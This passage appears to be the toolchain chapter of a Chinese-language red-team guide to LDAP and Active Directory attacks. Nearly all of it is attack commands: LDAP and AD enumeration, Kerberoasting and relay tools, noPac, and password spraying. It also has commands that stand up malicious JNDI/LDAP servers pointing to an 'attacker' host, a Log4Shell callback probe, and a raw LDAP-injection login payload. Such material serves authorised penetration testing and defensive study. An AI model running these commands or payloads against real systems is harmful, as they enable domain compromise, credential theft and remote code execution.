## 十一、工具链

### 11.1 枚举与探测
```bash
# ldapsearch（OpenLDAP客户端，最常用）
ldapsearch -x -H ldap://target -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName
ldapsearch -x -H ldap://target -D "cn=admin,dc=corp,dc=local" -w pass -b "dc=corp,dc=local" "(uid=*)"
ldapsearch -x -H ldaps://dc.corp.local -b "dc=corp,dc=local" "(servicePrincipalName=*)" \
  servicePrincipalName msDS-AllowedToDelegateTo
# 匿名绑定探测
ldapsearch -x -H ldap://target -s base -b "" namingContexts

# Nmap NSE
nmap -p 389,636,3268,3269 --script ldap-search,ldap-rootdse,ldap-brute target

# AD枚举全家桶
enum4linux-ng -A target
windapsearch.py -d corp.local -u u -p p --users --da --groups
ldapdomaindump -u 'corp.local\user' -p pass dc.corp.local -o ./dump
bloodhound-python -u user -p pass -d corp.local -c All -ns 10.10.10.10
```

### 11.2 自动化利用
```bash
# 盲注/爆破
ldap-blind-explorer（老牌盲注器）
# 域渗透联动
noPac.py / sam-the-admin（CVE-2021-42278/42287）
impacket 全家桶：GetNPUsers.py GetUserSPNs.py addcomputer.py renameMachine.py
ntlmrelayx.py（Relay to LDAP：--delegate-access / --escalate-user）
kerbrute（口令喷洒/Kerberoast验证）
hashcat -m 13100/18200（TGS/ASREP破解）
```

### 11.3 JNDI/LDAP RCE相关
```bash
# 恶意LDAP服务器搭建
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker:8888/#Exploit" 1389
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker:8888/#Exploit" 1099
java -jar rogue-jndi.jar -n "ldap://attacker:1389" -c "calc.exe"
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "cmd" -A attacker
# Log4Shell探测（无回显验证）
curl -X POST http://target/ -H "User-Agent: \${jndi:ldap://x.dnslog.cn/a}" -d "x=1"
# dnslog/interact.sh 观察LDAP/DNS回连
```

### 11.4 命令速查（红队实战备忘）
```bash
# 常用属性请求清单
ldapsearch -x -H ldap://target -b "dc=corp,dc=local" \
  "(sAMAccountName=*)" sAMAccountName userPrincipalName description info \
  memberOf servicePrincipalName userAccountControl whenCreated lastLogonTimestamp

# 盲注原始请求（Burp Repeater模板）
POST /login HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

username=admin)(&(userPassword=M*&password=x

# 通配符横向接管（见3.3）
# 框架转义复核（见8.1表）
# 域渗透联动（见第九章）
```

